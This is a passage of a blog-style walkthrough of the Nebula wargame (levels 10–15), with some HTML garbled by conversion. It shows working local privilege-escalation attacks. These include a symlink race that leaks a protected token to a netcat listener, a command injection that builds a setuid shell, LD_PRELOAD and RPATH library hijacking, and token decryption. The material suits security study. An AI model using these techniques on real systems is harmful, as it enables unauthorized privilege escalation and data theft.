
<h1>include &lt;fcntl.h></h1>

<h1>include &lt;errno.h></h1>

<h1>include &lt;sys/socket.h></h1>

<h1>include &lt;netinet/in.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char <em><em>argv)
{
  char </em>file;
  char </em>host;</p>

<p>  if(argc &lt; 3) {</p>

<pre><code>  printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
  exit(1);
</code></pre>

<p>  }</p>

<p>  file = argv[1];
  host = argv[2];</p>

<p>  if(access(argv[1], R_OK) == 0) {</p>

<pre><code>  int fd;
  int ffd;
  int rc;
  struct sockaddr_in sin;
  char buffer[4096];

  printf("Connecting to %s:18211 .. ", host); fflush(stdout);

  fd = socket(AF_INET, SOCK_STREAM, 0);

  memset(&amp;sin, 0, sizeof(struct sockaddr_in));
  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = inet_addr(host);
  sin.sin_port = htons(18211);

  if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
      printf("Unable to connect to host %s\n", host);
      exit(EXIT_FAILURE);
  }
</code></pre>

<h1>define HITHERE &ldquo;.oO Oo.\n&rdquo;</h1>

<pre><code>  if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
      printf("Unable to write banner to host %s\n", host);
      exit(EXIT_FAILURE);
  }
</code></pre>

<h1>undef HITHERE</h1>

<pre><code>  printf("Connected!\nSending file .. "); fflush(stdout);

  ffd = open(file, O_RDONLY);
  if(ffd == -1) {
      printf("Damn. Unable to open file\n");
      exit(EXIT_FAILURE);
  }

  rc = read(ffd, buffer, sizeof(buffer));
  if(rc == -1) {
      printf("Unable to read from file: %s\n", strerror(errno));
      exit(EXIT_FAILURE);
  }

  write(fd, buffer, rc);

  printf("wrote file!\n");
</code></pre>

<p>  } else {</p>

<pre><code>  printf("You don't have access to %s\n", file);
</code></pre>

<p>  }
}
```</p>

<p>As the description has it, this program seems to read a file and send its contents to a user specified IP address on tcp/18211. I tested this by opening a netcat listener with <code>nc -lk 18211</code> and sending myself a file to see what comes out. Obviously, I was not able to send the token that was in the same directory as the <code>flag10</code> binary as I did not have read access to this.</p>

<p>The problem with this program through is the fact that it checks if the file can be read using <code>access()</code>, then only later opens it using <code>open()</code>. Using this method it may be possible to change out the file before it hits the <code>open()</code> method. Symlinks are the goto for this kind of problem as they can be easily swapped out by relinking a file as the program runs. It of course helps that the file to read can be user specified. There is actually an acronym for this kind of bug called <a href="http://en.wikipedia.org/wiki/Time_of_check_to_time_of_use">TOCTTOU</a>. The Wikipedia article describes almost exactly the same scenario as we have here.</p>

<p>My plan of attack was to create a race condition. I would create an infinite loop that relinks a file from something I can actually read back to the token file and vice versa. While this continuous relinking occurs, I would run the affected binary, hoping that we would catch a case where the link swaps out as hoped for sending the token contents to my netcat listener. To increase my chances of the race condition occurring, I put the <code>flag10</code> binary in its own loop as well.</p>

<p>So, to solve level10:</p>

<p>```bash
level10@nebula:/home/flag10$ while true; do ln -sf /var/tmp/shell.c /var/tmp/flag10-token; ln -sf /home/flag10/token /var/tmp/flag10-token; done &amp;
[1] 14219</p>

<h1>the counties symlink swap is now happening between /var/tmp/shell.c which I can read and /home/flag10/token which I cant.</h1>

<p>level10@nebula:/home/flag10$ while true; do ./flag10 /var/tmp/flag10-token 192.168.217.1; done
You don&rsquo;t have access to /var/tmp/flag10-token
You don&rsquo;t have access to /var/tmp/flag10-token
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
```</p>

<p>On my netcat listener I now had:</p>

<p>```bash
~ » nc -lk 18211
.oO Oo.</p>

<h1>include&lt;stdio.h></h1>

<p>int main(void) {</p>

<pre><code>setresuid(geteuid(), geteuid(), geteuid());
system("/bin/sh");
return 0;
</code></pre>

<p>}</p>

<p>.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
```</p>

<p>With the token file read, we end the level:</p>

<p><code>bash
level10@nebula:/home/flag10$ su - flag10
Password:
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></p>

<h2>level11</h2>

<p><a href="https://exploit-exercises.com/nebula/level11/">Level11&rsquo;s Description</a>:
<blockquote><p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p></blockquote></p>

<p>With the description we are provided with the source code of a small PHP program:</p>

<p>```c level11.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/mman.h></h1>

<p>/<em>
 * Return a random, non predictable file, and return the file descriptor for it.
 </em>/</p>

<p>int getrand(char <em>*path)
{
  char </em>tmp;
  int pid;
  int fd;</p>

<p>  srandom(time(NULL));</p>

<p>  tmp = getenv(&ldquo;TEMP&rdquo;);
  pid = getpid();</p>

<p>  asprintf(path, &ldquo;%s/%d.%c%c%c%c%c%c&rdquo;, tmp, pid,</p>

<pre><code>  'A' + (random() % 26), '0' + (random() % 10),
  'a' + (random() % 26), 'A' + (random() % 26),
  '0' + (random() % 10), 'a' + (random() % 26));
</code></pre>

<p>  fd = open(<em>path, O_CREAT|O_RDWR, 0600);
  unlink(</em>path);
  return fd;
}</p>

<p>void process(char *buffer, int length)
{
  unsigned int key;
  int i;</p>

<p>  key = length &amp; 0xff;</p>

<p>  for(i = 0; i &lt; length; i++) {</p>

<pre><code>  buffer[i] ^= key;
  key -= buffer[i];
</code></pre>

<p>  }</p>

<p>  system(buffer);
}</p>

<h1>define CL &ldquo;Content-Length: &rdquo;</h1>

<p>int main(int argc, char <em><em>argv)
{
  char line[256];
  char buf[1024];
  char </em>mem;
  int length;
  int fd;
  char </em>path;</p>

<p>  if(fgets(line, sizeof(line), stdin) == NULL) {</p>

<pre><code>  errx(1, "reading from stdin");
</code></pre>

<p>  }</p>

<p>  if(strncmp(line, CL, strlen(CL)) != 0) {</p>

<pre><code>  errx(1, "invalid header");
</code></pre>

<p>  }</p>

<p>  length = atoi(line + strlen(CL));</p>

<p>  if(length &lt; sizeof(buf)) {</p>

<pre><code>  if(fread(buf, length, 1, stdin) != length) {
      err(1, "fread length");
  }
  process(buf, length);
</code></pre>

<p>  } else {</p>

<pre><code>  int blue = length;
  int pink;

  fd = getrand(&amp;path);

  while(blue &gt; 0) {
      printf("blue = %d, length = %d, ", blue, length);

      pink = fread(buf, 1, sizeof(buf), stdin);
      printf("pink = %d\n", pink);

      if(pink &lt;= 0) {
          err(1, "fread fail(blue = %d, length = %d)", blue, length);
      }
      write(fd, buf, pink);

      blue -= pink;
  }

  mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
  if(mem == MAP_FAILED) {
      err(1, "mmap");
  }
  process(mem, length);
</code></pre>

<p>  }</p>

<p>}
```</p>

<p>I&rsquo;ll admit. This level kicked my ass. Eventually I gave up and resorted to a few hints that could tell me how to proceed. None of the other walkthroughs that I read actually had working exploits for this level either. That which I have tried never got me to even execute <code>getflag</code> so that it would be happy with the effective user ids. Maybe this level is bugged, but I am not sure :(</p>

<h2>level12</h2>

<p><a href="https://exploit-exercises.com/nebula/level12/">Level12&rsquo;s Description</a>:
<blockquote><p>There is a backdoor process listening on port 50001.</p></blockquote></p>

<p>With the description we are provided with the source code of a small Lua program:</p>

<p>```lua level12.lua
local socket = require(&ldquo;socket&rdquo;)
local server = assert(socket.bind(&ldquo;127.0.0.1&rdquo;, 50001))</p>

<p>function hash(password)
  prog = io.popen(&ldquo;echo &rdquo;..password..&ldquo; | sha1sum&rdquo;, &ldquo;r&rdquo;)
  data = prog:read(&ldquo;*all&rdquo;)
  prog:close()</p>

<p>  data = string.sub(data, 1, 40)</p>

<p>  return data
end</p>

<p>while 1 do
  local client = server:accept()
  client:send(&ldquo;Password: &rdquo;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then</p>

<pre><code>  print("trying " .. line) -- log from where ;\
  local h = hash(line)

  if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
      client:send("Better luck next time\n");
  else
      client:send("Congrats, your token is 413**CARRIER LOST**\n")
  end
</code></pre>

<p>  end</p>

<p>  client:close()
end
```</p>

<p>This level had another very obvious command injection vulnerability on the line where a <code>password</code> variable is piped through <code>sha1sum</code>. I made a copy of this program and modified it to print me the outputs so that I could prepare a properly formatted command to be used on a socket. The basic idea of the injection was to separate the echo with a <code>;</code> character and compile my setuid C shell. I then added a hash (#) to ignore the rest of the command what would have been executed.</p>

<p>So, to solve level12:</p>

<p>```bash
level12@nebula:~$ echo &ldquo;;gcc /var/tmp/shell.c -o /var/tmp/flag12;chmod 4777 /var/tmp/flag12;#&rdquo; | nc 127.0.0.1 50001
Password: Better luck next time</p>

<p>level12@nebula:~$ /var/tmp/flag12
sh-4.2$ getflag
You have successfully executed getflag on a target account
sh-4.2$
```</p>

<h2>level13</h2>

<p><a href="https://exploit-exercises.com/nebula/level13/">Level13&rsquo;s Description</a>:
<blockquote><p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p></blockquote></p>

<p>With the description we are provided with the source code of a small C program:</p>

<p>```lua level13_safe.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;string.h></h1>

<h1>define FAKEUID 1000</h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int c;
  char token[256];</p>

<p>  if(getuid() != FAKEUID) {</p>

<pre><code>  printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
  printf("The system administrators will be notified of this violation\n");
  exit(EXIT_FAILURE);
</code></pre>

<p>  }</p>

<p>  // snip, sorry :)</p>

<p>  printf(&ldquo;your token is %s\n&rdquo;, token);</p>

<p>}
```</p>

<p>This level had me researching for quite some time. I came to learn of ELF DSO&rsquo;s and <code>LD_PRELOAD</code>. Basically, it is possible to have the dynamic linker preload shared libraries from the <code>LD_PRELOAD</code> environment variable that may allow for some functions to be modified. <a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">This</a> article contained most of the magic that was needed to get this level done.</p>

<p>I decided to &lsquo;override&rsquo; the <code>getuid()</code> function so that it would return the value of the <code>FAKEUID</code> constant in the program, instead of the value the real <code>getuid()</code> would have returned. For that to happen, I looked up the arguments for <code>getuid()</code> from the man page and copied that for my own purposes. I then compiled it as a shared library with the famous <code>-shared -fPIC</code> arguments for position independent code and exported the <code>LD_PRELOAD</code> variable prior to running the binary.</p>

<p>One important thing to note here is that this &lsquo;hack&rsquo; has a few gotchas. The executing binary and the library needs to be relative to each other. SETUID programs discard the <code>LD_PRELOAD</code> environment variable (for obvious reasons) so this is not a privilege escalation. In the source code we have received, there is a portion excluded (that probably just prints the token :P) on purpose. This means we can copy the binary and still be able to get the desired effect. Of course, we could also resort to slapping this into a debugger and checking what it is doing under the hood, but given the nature of Nebula, I figured the point is to actually override <code>getuid()</code>.</p>

<p>So, to solve level13:</p>

<p>```bash
level13@nebula:/var/tmp$ cp ~flag13/flag13 .</p>

<p>level13@nebula:/var/tmp$ cat fake_getuid.c</p>

<h1>include&lt;unistd.h></h1>

<p>uid_t getuid(void) {</p>

<pre><code>return 1000;
</code></pre>

<p>}</p>

<p>level13@nebula:/var/tmp$ gcc -shared -fPIC /var/tmp/fake_getuid.c -o /var/tmp/fake_getuid.o</p>

<p>level13@nebula:/var/tmp$ LD_PRELOAD=/var/tmp/fake_getuid.o ./flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58</p>

<p>level13@nebula:/var/tmp$ su &ndash; flag13
Password:
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account
```</p>

<h2>level14</h2>

<p><a href="https://exploit-exercises.com/nebula/level14/">Level14&rsquo;s Description</a>:
<blockquote><p>This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)</p></blockquote></p>

<p>Logged in as user <code>level14</code>, we see 2 files in the <code>flag14</code> directory:</p>

<p>```bash
level14@nebula:~$ cd ~flag14
level14@nebula:/home/flag14$ ls -lh
total 8.0K
-rwsr-x&mdash;&ndash; 1 flag14  level14 7.2K 2011-12-05 18:59 flag14
-rw&mdash;&mdash;&mdash;&ndash; 1 level14 level14   37 2011-12-05 18:59 token</p>

<p>level14@nebula:/home/flag14$ cat token
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
<code>``
</code>token<code>obviously being the target to decrypt. Running</code>flag14<code>tells us that it is expecting a</code>-e` flag to encrypt. So, I tested the encryption to see how it behaves:</p>

<p><code>bash
level14@nebula:/home/flag14$ ./flag14 -e
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^(
</code></p>

<p>What immediately jumped out at me was the A&rsquo;s that I had sent it came back as the alphabet. :D After a few tests I came to the conclusion that the key seems to start at 0, and increments with every character. Each characters ASCII value is then incremented by what ever the current value of the key is. To test this theory, I wrote a small python script to replicate this behavior:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<h1>exploit-exercises level14 cryptor</h1>

<p>string = &lsquo;AABBCCDDEEFFGG&rsquo;
key = 0
result = &lsquo;&rsquo;</p>

<p>print &lsquo;String: {s}\nStrlen: {l}\t&rsquo;.format(s = string, l = len(string))</p>

<p>for char in string:</p>

<pre><code>print 'Key: {key}\t Char: {char}\t Ord: {ord}\t Res: {res}'.format(
    key = key, char = char, ord = ord(char), res = chr(ord(char) + key)
)
result += chr(ord(char) + key)
key += 1
</code></pre>

<p>print &lsquo;\nResult: {res}&rsquo;.format(res = result)
```</p>

<p>Running this meant that the output would be:</p>

<p>```text
~ # python crypt.py
String: AABBCCDDEEFFGG
Strlen: 14
Key: 0   Char: A     Ord: 65     Res: A
Key: 1   Char: A     Ord: 65     Res: B
Key: 2   Char: B     Ord: 66     Res: D
Key: 3   Char: B     Ord: 66     Res: E
Key: 4   Char: C     Ord: 67     Res: G
Key: 5   Char: C     Ord: 67     Res: H
Key: 6   Char: D     Ord: 68     Res: J
Key: 7   Char: D     Ord: 68     Res: K
Key: 8   Char: E     Ord: 69     Res: M
Key: 9   Char: E     Ord: 69     Res: N
Key: 10  Char: F     Ord: 70     Res: P
Key: 11  Char: F     Ord: 70     Res: Q
Key: 12  Char: G     Ord: 71     Res: S
Key: 13  Char: G     Ord: 71     Res: T</p>

<p>Result: ABDEGHJKMNPQST
```</p>

<p>The same string was checked using the <code>flag14</code> cryptor:</p>

<p><code>bash
level14@nebula:/home/flag14$ ./flag14 -e
AABBCCDDEEFFGG
ABDEGHJKMNPQST
</code></p>

<p>A match :) Being able to replicate the encryption, meant that the decryption was trivial. Instead of adding 1 to the key, I simply subtracted 1 from the key in order to reverse the string in the <code>token</code> file:</p>

<p>```text
~ # python decrypt.py
String: 857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
Strlen: 36  Key start = 0
Key: 0   Char: 8     Ord: 56     Res: 8
Key: 1   Char: 5     Ord: 53     Res: 4
Key: 2   Char: 7     Ord: 55     Res: 5
Key: 3   Char: :     Ord: 58     Res: 7
Key: 4   Char: g     Ord: 103    Res: c
Key: 5   Char: 6     Ord: 54     Res: 1
Key: 6   Char: 7     Ord: 55     Res: 1
Key: 7   Char: ?     Ord: 63     Res: 8
Key: 8   Char: 5     Ord: 53     Res: &ndash;
Key: 9   Char: A     Ord: 65     Res: 8
Key: 10  Char: B     Ord: 66     Res: 8
Key: 11  Char: B     Ord: 66     Res: 7
Key: 12  Char: o     Ord: 111    Res: c
Key: 13  Char: :     Ord: 58     Res: &ndash;
Key: 14  Char: B     Ord: 66     Res: 4
Key: 15  Char: t     Ord: 116    Res: e
Key: 16  Char: D     Ord: 68     Res: 4
Key: 17  Char: A     Ord: 65     Res: 0
Key: 18  Char: ?     Ord: 63     Res: &ndash;
Key: 19  Char: t     Ord: 116    Res: a
Key: 20  Char: I     Ord: 73     Res: 5
Key: 21  Char: v     Ord: 118    Res: a
Key: 22  Char: L     Ord: 76     Res: 6
Key: 23  Char: D     Ord: 68     Res: &ndash;
Key: 24  Char: K     Ord: 75     Res: 3
Key: 25  Char: L     Ord: 76     Res: 3
Key: 26  Char: {     Ord: 123    Res: a
Key: 27  Char: M     Ord: 77     Res: 2
Key: 28  Char: Q     Ord: 81     Res: 5
Key: 29  Char: P     Ord: 80     Res: 3
Key: 30  Char: S     Ord: 83     Res: 5
Key: 31  Char: R     Ord: 82     Res: 3
Key: 32  Char: Q     Ord: 81     Res: 1
Key: 33  Char: W     Ord: 87     Res: 6
Key: 34  Char: W     Ord: 87     Res: 5
Key: 35  Char: .     Ord: 46     Res:</p>

<p>Result: 8457c118-887c-4e40-a5a6-33a25353165
```</p>

<p>So, to solve level14:</p>

<p><code>bash
level14@nebula:/home/flag14$ su - flag14
Password:
flag14@nebula:~$ getflag
You have successfully executed getflag on a target account
</code></p>

<h2>level15</h2>

<p><a href="https://exploit-exercises.com/nebula/level15/">Level15&rsquo;s Description</a>:
<blockquote><p>strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.<br/>You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.<br/>Clean up after yourself :)</p></blockquote></p>

<p>Logged in as user <code>level15</code>, we see 1 file in the <code>flag15</code> directory called <code>flag15</code>. Running it simply tells us to <em>strace it!</em>. Running it with <code>strace</code> immediately reveals a whole bunch of interesting things about <code>flag15</code>:</p>

<p><code>text
level15@nebula:/home/flag15$ strace ./flag15
execve("./flag15", ["./flag15"], [/* 20 vars */]) = 0
brk(0)                                  = 0x88c9000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786b000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/cmov", 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7862000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xe78000
mmap2(0xfee000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xfee000
mmap2(0xff1000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xff1000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7861000
set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb78618d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xfee000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x199000, 4096, PROT_READ)     = 0
munmap(0xb7862000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786a000
write(1, "strace it!\n", 11strace it!
)            = 11
exit_group(11)                          = ?
</code></p>

<p>There are <strong>plenty</strong> of attempts to load <code>libc.so.6</code> from various locations! I checked out what is in <code>/var/tmp</code> and found the original <code>flag15</code> folder there. It was empty. My initial thought were I need to give it a <code>libc.so.6</code> to load, but obviously one that will be useful enough to me so that I may gain some form of code execution.</p>

<p>This challenge had me on another Google ride in order to understand what is going on here. From what I could gather, when a binary is compiled with <code>gcc</code>, it is possible to add <code>hwcap</code> support for different processor architectures. It is also possible to tell the linker from where it should load dynamic libraries using a <a href="http://en.wikipedia.org/wiki/Rpath">rpath</a>. In the case of <code>flag15</code>, the <code>RPATH</code> is set to <code>/var/tmp/flag15</code>. We can see this using <code>readelf</code> and looking at the dynamic section:</p>

<p>```bash
level15@nebula:/home/flag15$ readelf -d ./flag15</p>

<p>Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 0x0000000c (INIT)                       0x80482c0
 0x0000000d (FINI)                       0x80484ac</p>

<p> [&hellip;]
```</p>

<p>Ok, so that kinda explained the <em>why</em> its loading libc.so.6 from there, but not really the &lsquo;how this can be useful&rsquo;. I was still a little stuck on the previous <code>LD_PRELOAD</code> hackery, but had to constantly remind myself that that environment variable will be discarded in the case of the SETUID program.</p>

<p>I was a little unsure how to get something useful going from here. I touched a file called <code>libc.so.6</code> in <code>/var/tmp/flag15/</code> and launched the binary, just to get a starting point:</p>

<p><code>bash
level15@nebula:/var/tmp/flag15$ touch libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: error while loading shared libraries: /var/tmp/flag15/libc.so.6: file too short
</code></p>

<p>I was not expecting much from that attempt, but it helped me get started. Eventually I figured I could have a look at <code>flag15</code> and check which libc function I could &ldquo;override??&rdquo; from the RELO table:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ objdump -R ~flag15/flag15</p>

<p>/home/flag15/flag15:     file format elf32-i386</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    <strong>gmon_start</strong>
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   <strong>gmon_start</strong>
0804a008 R_386_JUMP_SLOT   __libc_start_main
```</p>

<p><code>puts()</code> seems like an ok target for me! This is probably the function used to print the <em>strace it!</em> message. At this stage I figured I could take the same route as I did with the previous <code>LD_PRELOAD</code> attack, except this time I just &lsquo;fake&rsquo; it in my fake libc. I looked up the <code>puts()</code> arguments from the man page again and started a new function:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ cat fake_libc.c</p>

<h1>include&lt;stdio.h></h1>

<p>int puts(const char *s) {</p>

<pre><code>printf("Not the real puts!\n");
</code></pre>

<p>}</p>

<p>level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6</p>

<p>level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
```</p>

<p>Ow, that exploded pretty badly it seems. From the error message I figured the function <code>__cxa_finalize</code> simply did not exist in my library, so all I had to do was add it&hellip; Right? I googled the <a href="https://refspecs.linuxbase.org/LSB_3.2.0/LSB-Core-generic/LSB-Core-generic/baselib---cxa_finalize.html">function arguments</a> and added it to my fake libc:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ cat fake_libc.c</p>

<h1>include&lt;stdio.h></h1>

<p>void __cxa_finalize(void * d) {
}</p>

<p>int puts(const char *s) {</p>

<pre><code>printf("Not the real puts!\n");
</code></pre>

<p>}
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: relocation error: /home/flag15/flag15: symbol __libc_start_main, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```</p>

<p>Oh! New error. I guess I was making progress. This time there is apparently no <code>__libc_start_main</code> in the library. At this stage I was a little confused as to what was going on here as this function was also in the RELO table for <code>flag15</code>. Anyways, as with <code>__cxa_finalize</code>, I Googled the <a href="http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html">function arguments</a> for this one too and added it to my fake libc. It was also at this stage that I realized I could just use this function instead of <code>puts</code>, so I went ahead and deleted the other functions:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ cat fake_libc.c</p>

<h1>include&lt;stdio.h></h1>

<p>int __libc_start_main(int (<em>main) (int, char * </em>, char * <em>), int argc, char * * ubp_av, void (</em>init) (void), void (<em>fini) (void), void (</em>rtld_fini) (void), void (* stack_end)) {</p>

<pre><code>return 0;
</code></pre>

<p>}</p>

<p>level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion `version->filename == ((void *)0) || ! _dl_name_match_p (version->filename, map)&lsquo; failed!
```</p>

<p>Oh! Another new error :( This time though it was not about a missing function/symbol, but rather something I could not make out by myself. I found little information about this specific error. After a really really long time of searching I finally decided to <code>ldd</code> <code>flag15</code> again now that my fake libc is available:</p>

<p>```bash
level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)</p>

<pre><code>linux-gate.so.1 =&gt;  (0x00e47000)
libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00761000)
</code></pre>

<p>```</p>

